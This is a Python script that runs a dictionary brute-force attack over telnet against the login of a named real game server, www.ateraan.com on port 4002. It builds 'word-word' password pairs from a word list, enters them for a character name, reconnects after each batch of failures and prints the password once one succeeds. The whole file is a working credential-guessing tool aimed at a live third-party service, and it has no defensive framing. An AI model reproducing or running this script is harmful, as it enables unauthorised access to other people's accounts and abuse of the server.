__author__ = 'Wheeler'

from telnetlib import Telnet

file = open("words")
combination = ""
combinations = []
words1 = []
words2 = []

for word in file:
	word = word.strip("\n")
	if "'" in word:
		continue

	if word[0].isupper():
		continue

	try:
		word.encode('ascii')
	except UnicodeEncodeError:
		continue

	words2.append(word)
	words1.append(word)

file.close()


hostname = "www.ateraan.com"
port = 4002
username = "username"

telnet = Telnet(host=hostname, port=port)
incorrect_password = True

count = 0
i = 0
while i < len(words1):

	j = 0
	while j < len(words2):

		combination = words1[i]+"-"+words2[j]
		print(combination)

		telnet.read_until(b"Enter your character name:")
		telnet.write(username.encode('ascii') + b"\n")

		telnet.read_until(b"Enter your password:")
		telnet.write(combination.encode('ascii') + b"\n")

		incorrect_password = telnet.read_until(b"Try again :", 30).decode("utf-8").rstrip().endswith("Try again :")
		if incorrect_password is not True:
			break

		j += 1
		if j >= len(words2):
			continue
		combination = words1[i]+"-"+words2[j]
		print(combination)

		telnet.write(combination.encode('ascii') + b"\n")

		incorrect_password = telnet.read_until(b"Try again :", 30).decode("utf-8").rstrip().endswith("Try again :")
		if incorrect_password is not True:
			break

		j += 1
		if j >= len(words2):
			continue
		combination = words1[i]+"-"+words2[j]
		print(combination)

		telnet.write(combination.encode('ascii') + b"\n")

		incorrect_password = telnet.read_until(b"Try again :", 30).decode("utf-8").rstrip().endswith("Try again :")
		if incorrect_password is not True:
			break

		j += 1
		if j >= len(words2):
			continue
		combination = words1[i]+"-"+words2[j]
		print(combination)

		telnet.write(combination.encode('ascii') + b"\n")

		incorrect_password = telnet.read_until(b"return later.", 30).decode("utf-8").rstrip().endswith("return later.")
		if incorrect_password is not True:
			break

		telnet.read_all()

		telnet.open(host=hostname, port=port)

		j += 1

	else:
		i += 1
		continue
	break

telnet.close()
print("Username:", username)
print("Password:", combination)
